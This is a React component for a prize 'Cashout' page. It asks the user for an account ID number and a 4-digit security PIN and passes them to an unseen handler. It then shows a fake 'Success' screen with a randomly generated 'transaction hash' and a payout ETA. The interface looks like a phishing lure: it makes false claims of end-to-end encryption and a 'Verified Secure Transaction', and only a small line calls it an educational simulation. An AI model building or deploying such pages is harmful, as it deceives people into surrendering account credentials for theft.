import React, { useState } from 'react';
import { motion } from 'motion/react';
import { Wallet, ShieldCheck, Info, CheckCircle2, ArrowRight, Lock, CreditCard } from 'lucide-react';

interface CashoutProps {
  prize: string;
  onComplete: (data: { id_number: string; id_pin: string; currency: string }) => void;
}

const CURRENCIES = ['PHP (₱)', 'USD ($)', 'EUR (€)', 'GBP (£)'];

export const Cashout: React.FC<CashoutProps> = ({ prize, onComplete }) => {
  const [idNumber, setIdNumber] = useState('');
  const [idPin, setIdPin] = useState('');
  const [currency, setCurrency] = useState(CURRENCIES[0]);
  const [isSubmitted, setIsSubmitted] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!idNumber || !idPin) return;
    
    setIsSubmitted(true);
    onComplete({ id_number: idNumber, id_pin: idPin, currency });
  };

  if (isSubmitted) {
    return (
      <div className="min-h-screen bg-zinc-950 text-white flex flex-col items-center justify-center p-6 relative overflow-hidden">
        <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-[400px] h-[400px] bg-emerald-500/10 blur-[100px] rounded-full pointer-events-none"></div>
        
        <motion.div
          initial={{ opacity: 0, scale: 0.9, y: 20 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          className="max-w-md w-full bg-white text-zinc-950 p-10 rounded-[2.5rem] shadow-2xl text-center space-y-8 relative z-10"
        >
          <div className="flex justify-center">
            <motion.div 
              initial={{ scale: 0 }}
              animate={{ scale: 1 }}
              transition={{ type: "spring", stiffness: 200, delay: 0.2 }}
              className="bg-emerald-100 p-6 rounded-full"
            >
              <CheckCircle2 className="w-16 h-16 text-emerald-600" />
            </motion.div>
          </div>
          
          <div className="space-y-3">
            <h2 className="text-4xl font-black tracking-tight">Success!</h2>
            <p className="text-zinc-500 font-medium leading-relaxed">
              Your <span className="text-emerald-600 font-bold">{prize}</span> reward has been authorized and is now being processed.
            </p>
          </div>

          <div className="bg-zinc-50 p-6 rounded-3xl border border-zinc-100 space-y-4">
            <div className="flex justify-between items-center text-sm">
              <span className="text-zinc-400 font-bold uppercase tracking-wider">Status</span>
              <span className="bg-emerald-100 text-emerald-700 px-3 py-1 rounded-full font-black text-[10px] uppercase">Processing</span>
            </div>
            <div className="h-px bg-zinc-200/50 w-full"></div>
            <div className="flex justify-between items-center text-sm">
              <span className="text-zinc-400 font-bold uppercase tracking-wider">ETA</span>
              <span className="text-zinc-900 font-black">2-5 Business Days</span>
            </div>
          </div>

          <div className="pt-4">
            <p className="text-[10px] text-zinc-400 font-bold uppercase tracking-widest mb-2">Transaction Hash</p>
            <p className="text-xs font-mono bg-zinc-100 py-2 px-4 rounded-xl text-zinc-600 break-all">
              {Math.random().toString(36).substring(2, 15).toUpperCase()}{Math.random().toString(36).substring(2, 15).toUpperCase()}
            </p>
          </div>
        </motion.div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-zinc-950 text-white flex flex-col items-center justify-center p-6 relative overflow-hidden">
      <div className="absolute top-0 left-0 w-full h-full bg-[radial-gradient(circle_at_50%_50%,rgba(16,185,129,0.05),transparent_50%)]"></div>

      <motion.div
        initial={{ opacity: 0, y: 30 }}
        animate={{ opacity: 1, y: 0 }}
        className="max-w-md w-full bg-white text-zinc-950 p-8 sm:p-10 rounded-[3rem] shadow-2xl space-y-10 relative z-10"
      >
        <div className="flex items-center gap-5">
          <div className="bg-emerald-500 p-4 rounded-2xl shadow-lg shadow-emerald-500/20">
            <Wallet className="w-8 h-8 text-white" />
          </div>
          <div>
            <h2 className="text-3xl font-black tracking-tight">Cashout</h2>
            <p className="text-zinc-400 font-medium">Secure reward transfer</p>
          </div>
        </div>

        <div className="relative overflow-hidden bg-zinc-900 rounded-3xl p-6 text-white">
          <div className="absolute top-0 right-0 p-4 opacity-10">
            <CreditCard size={80} />
          </div>
          <div className="relative z-10 space-y-1">
            <p className="text-[10px] font-black text-zinc-500 uppercase tracking-[0.2em]">Available Balance</p>
            <p className="text-4xl font-black tracking-tighter text-emerald-400">{prize}</p>
          </div>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest ml-1 flex items-center gap-2">
              <Lock size={10} /> Preferred Currency
            </label>
            <select
              value={currency}
              onChange={(e) => setCurrency(e.target.value)}
              className="w-full p-4 bg-zinc-50 border border-zinc-200 rounded-2xl focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 outline-none transition-all font-bold text-zinc-700 appearance-none cursor-pointer"
            >
              {CURRENCIES.map(c => <option key={c} value={c}>{c}</option>)}
            </select>
          </div>

          <div className="space-y-2">
            <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest ml-1">Account ID Number</label>
            <input
              type="text"
              required
              placeholder="e.g. 1234-5678-9012"
              value={idNumber}
              onChange={(e) => setIdNumber(e.target.value)}
              className="w-full p-4 bg-zinc-50 border border-zinc-200 rounded-2xl focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 outline-none transition-all font-medium"
            />
          </div>

          <div className="space-y-2">
            <label className="text-[10px] font-black text-zinc-400 uppercase tracking-widest ml-1">Security PIN</label>
            <input
              type="password"
              required
              placeholder="••••"
              maxLength={4}
              value={idPin}
              onChange={(e) => setIdPin(e.target.value)}
              className="w-full p-4 bg-zinc-50 border border-zinc-200 rounded-2xl focus:ring-2 focus:ring-emerald-500/20 focus:border-emerald-500 outline-none transition-all font-medium tracking-[0.5em]"
            />
          </div>

          <div className="flex gap-3 text-[10px] text-zinc-400 bg-zinc-50 p-4 rounded-2xl border border-zinc-100 leading-relaxed">
            <ShieldCheck className="w-5 h-5 text-emerald-500 shrink-0" />
            <p className="font-medium">
              Your transaction is protected by end-to-end encryption. This is a secure simulation for educational purposes.
            </p>
          </div>

          <motion.button
            whileHover={{ scale: 1.02, y: -2 }}
            whileTap={{ scale: 0.98 }}
            type="submit"
            className="group w-full py-5 bg-zinc-950 hover:bg-zinc-900 text-white font-black text-xl rounded-[2rem] shadow-2xl transition-all flex items-center justify-center gap-3"
          >
            Authorize Payout
            <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
          </motion.button>
        </form>

        <div className="flex items-center gap-2 justify-center text-zinc-400 text-[10px] font-bold uppercase tracking-widest">
          <Info className="w-3 h-3" />
          <span>Verified Secure Transaction</span>
        </div>
      </motion.div>
    </div>
  );
};
